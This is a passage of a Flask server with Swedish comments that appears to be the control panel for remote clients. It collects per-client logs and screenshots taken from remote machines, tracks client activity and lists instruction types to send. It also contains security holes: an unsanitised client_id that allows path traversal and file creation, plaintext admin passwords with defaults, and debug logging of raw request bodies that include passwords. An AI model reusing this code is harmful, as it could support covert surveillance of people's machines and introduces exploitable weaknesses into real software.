        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid rensning av loggar: {str(e)}"}), 500

@app.route("/api/export_logs", methods=["POST"])
def api_export_logs():
    """API-endpunkt för att exportera en klients loggar."""
    logging.debug(f"Exportera loggförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Exportera loggförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
        else:
            data = {key: request.form[key] for key in request.form}
        logging.debug(f"Parsad data: {data}")
            
        if not data:
            logging.error("Ogiltig data i exportera loggförfrågan")
            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
            
        client_id = data.get("client_id")
        if not client_id:
            logging.warning("Ogiltig exportera loggförfrågan: Saknar client_id")
            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
    except Exception as e:
        logging.error(f"Fel vid parsning av exportera loggförfrågan: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
    
    log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
    if not os.path.exists(log_file):
        try:
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            logging.debug(f"Skapar tom loggfil på {log_file}")
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"Loggfil skapad: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("Inga loggar tillgängliga än\n")
                f.write("-" * 50 + "\n\n")
            logging.info(f"Skapade tom loggfil för klient {client_id}")
        except Exception as e:
            logging.error(f"Fel vid skapande av loggfil för klient {client_id}: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return jsonify({"status": "error", "message": "Misslyckades med att skapa loggfil"}), 500
    
    try:
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            try:
                with open(log_file, 'r', encoding='utf-8', errors='replace') as f:
                    log_content = f.read()
                logging.debug(f"Läste logginnehåll från {log_file}, längd: {len(log_content)}")
                zf.writestr(f"{client_id}_logs.txt", log_content)
            except Exception as e:
                logging.error(f"Fel vid läsning av loggfil: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
                zf.writestr(f"{client_id}_error.txt", f"Fel vid läsning av loggfil: {str(e)}")
                
        memory_file.seek(0)
        logging.debug(f"Förberedde zip-fil för nedladdning, storlek: {memory_file.getbuffer().nbytes} byte")
        return send_file(
            memory_file,
            mimetype='application/zip',
            as_attachment=True,
            download_name=f"{client_id}_logs.zip"
        )
    except Exception as e:
        logging.error(f"Fel vid export av loggar för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid export av loggar: {str(e)}"}), 500

@app.route("/api/get_screenshots", methods=["GET"])
def api_get_screenshots():
    """API-endpunkt för att hämta tagna skärmdumpar med ytterligare metadata."""
    logging.debug(f"Hämta skärmdumpförfrågan från {request.remote_addr}")
    logging.info(f"Hämta skärmdumpförfrågan från {request.remote_addr}")
    try:
        if os.path.exists(SCREENSHOTS_FILE):
            with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
                screenshots_data = json.load(sf)
            logging.debug(f"Laddade skärmdumpdata med {len(screenshots_data)} poster")
                
            enhanced_screenshots = []
            for idx, entry in enumerate(screenshots_data):
                client_id = sanitize_filename(entry.get("user", "unknown"))
                enhanced_screenshots.append({
                    "id": idx,
                    "timestamp": entry.get("timestamp", "Okänd"),
                    "client_id": client_id,
                    "client_name": entry.get("user", "Okänd"),
                    "system": entry.get("system", "Okänd"),
                    "data": entry.get("data", "")
                })
            logging.debug(f"Förberedde {len(enhanced_screenshots)} förbättrade skärmdumpposter")
                
            return jsonify({"status": "success", "screenshots": enhanced_screenshots})
        else:
            logging.warning("Skärmdumpfilen hittades inte")
            return jsonify({"status": "success", "screenshots": []})
    except Exception as e:
        logging.error(f"Fel vid hämtning av skärmdumpar: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid hämtning av skärmdumpar: {str(e)}"}), 500

@app.route("/api/download_screenshot/<int:screenshot_id>", methods=["GET"])
def api_download_screenshot(screenshot_id):
    """API-endpunkt för att ladda ner en specifik skärmdump."""
    logging.debug(f"Ladda ner skärmdumpförfrågan från {request.remote_addr} för ID {screenshot_id}")
    logging.info(f"Ladda ner skärmdumpförfrågan från {request.remote_addr} för ID {screenshot_id}")
    try:
        if os.path.exists(SCREENSHOTS_FILE):
            with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
                screenshots_data = json.load(sf)
            logging.debug(f"Laddade skärmdumpdata med {len(screenshots_data)} poster")
                
            if 0 <= screenshot_id < len(screenshots_data):
                screenshot = screenshots_data[screenshot_id]
                base64_data = screenshot.get("data", "")
                timestamp = screenshot.get("timestamp", "okänd_tid").replace(" ", "_").replace(":", "-")
                client_name = sanitize_filename(screenshot.get("user", "unknown"))
                logging.debug(f"Förbereder skärmdump - klient: {client_name}, tidsstämpel: {timestamp}, datalängd: {len(base64_data)}")
                
                filename = f"skärmdump_{client_name}_{timestamp}.png"
                binary_data = base64.b64decode(base64_data)
                memory_file = io.BytesIO(binary_data)
                memory_file.seek(0)
                logging.debug(f"Avkodade Base64-data, filstorlek: {memory_file.getbuffer().nbytes} byte")
                
                return send_file(
                    memory_file,
                    mimetype='image/png',
                    as_attachment=True,
                    download_name=filename
                )
            else:
                logging.warning(f"Skärmdump-ID {screenshot_id} utanför intervallet")
                return jsonify({"status": "error", "message": "Skärmdumpen hittades inte"}), 404
        else:
            logging.warning("Skärmdumpfilen hittades inte")
            return jsonify({"status": "error", "message": "Inga skärmdumpar tillgängliga"}), 404
    except Exception as e:
        logging.error(f"Fel vid nedladdning av skärmdump: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid nedladdning av skärmdump: {str(e)}"}), 500

@app.route("/api/get_client_details/<client_id>", methods=["GET"])
def get_client_details(client_id):
    """API-endpunkt för att hämta detaljerad klientinformation."""
    logging.debug(f"Hämta klientdetaljer för {client_id} från {request.remote_addr}")
    if not client_id:
        logging.warning("Klient-ID krävs men angavs inte")
        return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400

    client_index = {}
    if os.path.exists(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return jsonify({"status": "error", "message": "Kunde inte ladda klientindex"}), 500

    if client_id in client_index:
        logging.debug(f"Returnerar detaljer för klient {client_id}: {client_index[client_id]}")
        return jsonify({"status": "success", "client_details": client_index[client_id]})
    else:
        logging.warning(f"Klient {client_id} hittades inte")
        return jsonify({"status": "error", "message": "Klienten hittades inte"}), 404

def get_admin_credentials():
    """Hämtar aktuella adminuppgifter eller returnerar standardvärden."""
    logging.debug("Hämtar adminuppgifter")
    try:
        if os.path.exists(ADMIN_CREDENTIALS_FILE):
            with open(ADMIN_CREDENTIALS_FILE, "r", encoding="utf-8") as f:
                creds = json.load(f)
            logging.debug(f"Laddade uppgifter: {creds}")
            return creds.get("username", DEFAULT_ADMIN_USERNAME), creds.get("password", DEFAULT_ADMIN_PASSWORD)
        else:
            logging.info("Adminuppgiftsfilen hittades inte. Skapar med standardvärden.")
            set_admin_credentials(DEFAULT_ADMIN_USERNAME, DEFAULT_ADMIN_PASSWORD)
    except Exception as e:
        logging.error(f"Fel i get_admin_credentials: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
    
    logging.debug(f"Returnerar standarduppgifter: {DEFAULT_ADMIN_USERNAME}")
    return DEFAULT_ADMIN_USERNAME, DEFAULT_ADMIN_PASSWORD

def set_admin_credentials(username, password):
    """Sparar nya adminuppgifter."""
    logging.debug(f"Sätter adminuppgifter för användare: {username}")
    try:
        os.makedirs(os.path.dirname(ADMIN_CREDENTIALS_FILE), exist_ok=True)
        with open(ADMIN_CREDENTIALS_FILE, "w", encoding="utf-8") as f:
            json.dump({"username": username, "password": password}, f, indent=4)
        logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare: {username}")
        return True
    except Exception as e:
        logging.error(f"Fel vid sparande av adminuppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

@app.route("/api/update_credentials", methods=["POST"])
def api_update_credentials():
    """API-endpunkt för att uppdatera adminuppgifter."""
    logging.debug(f"Uppdatera uppgifterförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Uppdatera uppgifterförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
            username = data.get("username")
            password = data.get("password")
        else:
            username = request.form.get("username")
            password = request.form.get("password")
        logging.debug(f"Parsad data - användarnamn: {username}, lösenordslängd: {len(password) if password else 0}")
            
        if not username or not password:
            logging.warning("Ogiltig uppdateringsförfrågan för uppgifter: Saknar användarnamn eller lösenord")
            return jsonify({"status": "error", "message": "Användarnamn och lösenord krävs"}), 400
    except Exception as e:
        logging.error(f"Fel vid parsning av uppdateringsförfrågan för uppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
        
    try:
        success = set_admin_credentials(username, password)
        if success:
            logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare {username}")
            return jsonify({"status": "success"})
        else:
            logging.warning(f"Misslyckades med att uppdatera adminuppgifter för användare {username}")
            return jsonify({"status": "error", "message": "Misslyckades med att uppdatera uppgifter"}), 500
    except Exception as e:
        logging.error(f"Fel vid uppdatering av adminuppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid uppdatering av uppgifter: {str(e)}"}), 500

@app.route("/viewer", methods=["GET", "POST"])
def viewer():
    """Adminpanel för att visa klientloggar."""
    logging.debug(f"Visarförfrågan från {request.remote_addr}, metod: {request.method}")
    admin_username, admin_password = get_admin_credentials()
    
    if "authenticated" not in session:
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            logging.info(f"Inloggningsförsök från {request.remote_addr}: användarnamn='{username}'")
            if username == admin_username and password == admin_password:
                logging.info("Inloggning lyckades")
                session["authenticated"] = True
                return redirect(url_for("viewer"))
            else:
                logging.warning("Inloggning misslyckades: Ogiltiga uppgifter")
                return render_template("login.html", error="Ogiltiga inloggningsuppgifter")
        logging.debug("Renderar inloggningssida")
        return render_template("login.html")

    if "logout" in request.args:
        session.pop("authenticated", None)
        logging.info(f"Användare loggade ut från {request.remote_addr}")
        return redirect(url_for("viewer"))

    clients = {}
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index för visaren från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                clients = json.load(f) or {}
            logging.debug(f"Laddade {len(clients)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json för visaren: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            clients = {}
    else:
        logging.debug(f"Initialiserar tomt klientindex på {INDEX_FILE}")
        if os.path.exists(INDEX_FILE) and os.path.isdir(INDEX_FILE):
            logging.warning("Klientindexvägen är en katalog. Tar bort och skapar ny fil.")
            shutil.rmtree(INDEX_FILE)
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump({}, f, indent=4)

    for client_id, client_info in clients.items():
        client_info["is_active"] = is_client_active(client_info.get("last_activity", ""))
        logging.debug(f"Klient {client_id} aktiv status: {client_info['is_active']}")

    selected_client = request.args.get("client", "")
    log_content = ""
    client_info = None
    sort_order = request.args.get("sort", "newest")
    logging.debug(f"Vald klient: {selected_client}, sorteringsordning: {sort_order}")

    if selected_client and selected_client in clients:
        client_info = clients[selected_client]
        log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{selected_client}.log")
        if os.path.exists(log_file):
            try:
                with open(log_file, "r", encoding="utf-8", errors="replace") as f:
                    log_content = f.read()
                logging.debug(f"Läste logginnehåll från {log_file}, längd: {len(log_content)}")
                if sort_order:
                    log_content = sort_log_entries(log_content, sort_order)
                log_content = log_content.replace("\n", "<br>").replace(" ", " ")
            except Exception as e:
                logging.error(f"Fel vid läsning av loggfil {log_file}: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
                log_content = f"<span style='color:red'>Fel vid läsning av loggfil: {str(e)}</span>"
        else:
            log_content = "<span style='color:orange'>Inga loggar tillgängliga för denna klient än.</span>"
            logging.debug(f"Ingen loggfil hittades för {selected_client}")

    total_clients = len(clients)
    try:
        total_logs = sum(1 for filename in os.listdir(CLIENT_LOGS_DIRECTORY) if filename.endswith('.log'))
        logging.debug(f"Räknade {total_logs} loggfiler")
    except Exception as e:
        logging.error(f"Fel vid räkning av loggfiler: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        total_logs = 0
        
    active_clients = sum(1 for client in clients.values() if is_client_active(client.get("last_activity", "")))
    logging.debug(f"Aktiva klienter: {active_clients}")

    storage_used = 0
    try:
        for root, dirs, files in os.walk(LOG_DIRECTORY):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    storage_used += os.path.getsize(file_path)
        logging.debug(f"Beräknade lagringsutnyttjande: {storage_used} byte")
    except Exception as e:
        logging.error(f"Fel vid beräkning av lagringsutnyttjande: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")

    if storage_used < 1024:
        storage_used_str = f"{storage_used} B"
    elif storage_used < 1024 * 1024:
        storage_used_str = f"{storage_used / 1024:.2f} KB"
    elif storage_used < 1024 * 1024 * 1024:
        storage_used_str = f"{storage_used / (1024 * 1024):.2f} MB"
    else:
        storage_used_str = f"{storage_used / (1024 * 1024 * 1024):.2f} GB"
    logging.debug(f"Lagringsutnyttjande formaterat: {storage_used_str}")

    latest_activity = datetime.fromtimestamp(0)
    for cinfo in clients.values():
        last_activity_str = cinfo.get("last_activity", "")
        try:
            last_activity_dt = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
            if last_activity_dt > latest_activity:
                latest_activity = last_activity_dt
        except ValueError:
            pass

    latest_activity_str = (
        latest_activity.strftime("%Y-%m-%d %H:%M:%S") if latest_activity.timestamp() > 0
        else "Ingen aktivitet"
    )
    logging.debug(f"Senaste aktivitet: {latest_activity_str}")

    try:
        sorted_clients = sorted(
            [{"id": cid, **cdata} for cid, cdata in clients.items()],
            key=lambda x: datetime.strptime(x.get("last_activity", "1970-01-01 00:00:00"), "%Y-%m-%d %H:%M:%S"),
            reverse=True
        )
        logging.debug(f"Sorterade {len(sorted_clients)} klienter efter senaste aktivitet")
    except Exception as e:
        logging.error(f"Fel vid sortering av klienter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        sorted_clients = [{"id": cid, **cdata} for cid, cdata in clients.items()]
    
    if request.args.get("partial") == "1" and selected_client:
        logging.debug(f"Returnerar partiellt svar med logginnehåll för {selected_client}")
        return log_content
    
    logging.debug("Renderar viewer.html med all data")
    return render_template(
        "viewer.html",
        clients=clients,
        sorted_clients=sorted_clients,
        selected_client=selected_client,
        client_info=client_info,
        log_content=log_content,
        total_clients=total_clients,
        active_clients=active_clients,
        total_logs=total_logs,
        storage_used=storage_used_str,
        latest_activity=latest_activity_str,
        sort_order=sort_order,
        instruction_types=list(INSTRUCTIONS.keys())
    )

def auto_ping_clients():
    """Skickar periodiska pingar till alla klienter."""
    global auto_ping_running
    logging.debug("Autopingtråd startad")
    logging.info("Autopingtråd startad. Kommer att pinga klienter var %d sekund.", AUTO_PING_INTERVAL)
    
    while auto_ping_running:
        logging.debug("Startar automatisk pingcykel")
        logging.info("Startar automatisk ping av alla klienter...")
        try:
            client_count = 0
            online_count = 0
            offline_count = 0
            
            if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    clients = json.load(f) or {}
                logging.debug(f"Laddade klienter för ping: {list(clients.keys())}")
                
                client_count = len(clients)
                if client_count == 0:
                    logging.info("Inga klienter hittades att pinga.")
                
                for client_id, client_info in clients.items():
                    logging.debug(f"Pingar klient: {client_id}")
                    try:
                        last_activity_str = client_info.get("last_activity", "1970-01-01 00:00:00")
                        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
                        now = datetime.now()
                        
                        if (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES):
                            update_ping_status(client_id, "online")
                            logging.info(f"Klient {client_id} är online (nyligen aktiv)")
                            online_count += 1
                        else:
                            update_ping_status(client_id, "offline")
                            logging.info(f"Klient {client_id} är offline (inaktiv)")
                            offline_count += 1
                    except Exception as e:
                        logging.error(f"Fel vid ping av klient {client_id}: {e}")
                        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            else:
                logging.warning("Klientindexfilen hittades inte eller är en katalog")
                if not os.path.exists(INDEX_FILE) or os.path.isdir(INDEX_FILE):
                    if os.path.isdir(INDEX_FILE):
                        shutil.rmtree(INDEX_FILE)
                    os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
                    with open(INDEX_FILE, "w", encoding="utf-8") as f:
                        json.dump({}, f, indent=4)
                    logging.info("Skapade tom klientindexfil")
            
            logging.info(f"Autoping slutförd. Resultat: {client_count} totalt, {online_count} online, {offline_count} offline")
            try:
                os.makedirs(os.path.dirname(PING_STATUS_FILE), exist_ok=True)
                with open(PING_STATUS_FILE, "w", encoding="utf-8") as f:
                    json.dump({
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "total_clients": client_count,
                        "online_clients": online_count,
                        "offline_clients": offline_count
                    }, f, indent=4)
                logging.debug(f"Sparade pingstatus till {PING_STATUS_FILE}")
            except Exception as e:
                logging.error(f"Fel vid sparande av pingstatistik: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        except Exception as e:
            logging.error(f"Fel under automatisk ping: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        logging.debug(f"Väntar {AUTO_PING_INTERVAL} sekunder till nästa autoping")
        time.sleep(AUTO_PING_INTERVAL)

def start_auto_ping():
    """Startar autopingbakgrundstråden."""
    global auto_ping_thread, auto_ping_running
    logging.debug("Försöker starta autopingtråd")
    try:
        if auto_ping_thread is None or not auto_ping_thread.is_alive():
            auto_ping_running = True
            auto_ping_thread = threading.Thread(target=auto_ping_clients)
            auto_ping_thread.daemon = True
            auto_ping_thread.start()
            logging.info("Bakgrundstråd för automatisk ping startad framgångsrikt")
            return True
        else:
            logging.info("Autopingtråden körs redan")
            return True
    except Exception as e:
        logging.error(f"Misslyckades med att starta autopingtråd: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def stop_auto_ping():
    """Stoppar autopingbakgrundstråden."""
    global auto_ping_running
    logging.debug("Stoppar autopingtråd")
    auto_ping_running = False
    logging.info("Bakgrundstråd för automatisk ping stoppas (slutar efter nuvarande cykel)")

@app.route("/health", methods=["GET"])
def health_check():
    """Enkel hälsokontroll-endpunkt."""
    logging.debug(f"Hälsokontrollförfrågan från {request.remote_addr}")
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "server": "neea-server",
        "version": "1.2.0"
    })

@app.route("/version", methods=["GET"])
def version_check():
    """Returnerar Python-version för felsökning."""
    import sys
    logging.debug(f"Versionskontrollförfrågan från {request.remote_addr}")
    version = f"Python-version: {sys.version}"
    logging.debug(f"Returnerar version: {version}")
    return version

@app.route("/", methods=["GET"])
def index():
    """Omdirigerar till visaren."""
    logging.debug(f"Rotförfrågan från {request.remote_addr}, omdirigerar till visaren")
    return redirect(url_for("viewer"))

if __name__ == "__main__":
    logging.info("Startar Neea-server...")
    logging.debug(f"Basdirectory: {BASE_DIR}")
    logging.debug(f"Loggkatalog: {LOG_DIRECTORY}")
    logging.debug(f"Klientloggkatalog: {CLIENT_LOGS_DIRECTORY}")
    logging.debug(f"Indexfil: {INDEX_FILE}")
    
    for directory in [LOG_DIRECTORY, CLIENT_LOGS_DIRECTORY, STATIC_DIRECTORY]:
        logging.debug(f"Säkerställer att katalogen finns: {directory}")
        os.makedirs(directory, exist_ok=True)
    
    logging.debug("Installerar statiska filer")
    install_static_files()
    
    logging.debug("Startar autopingtråd")
    started = start_auto_ping()
    if started:
        logging.info("Autopingtråd startad framgångsrikt.")
    else:
        logging.warning("Misslyckades med att starta autopingtråd.")
    
    logging.info("Startar servern på port 8080 med HTTP...")
    app.run(host="0.0.0.0", port=8080, debug=False)
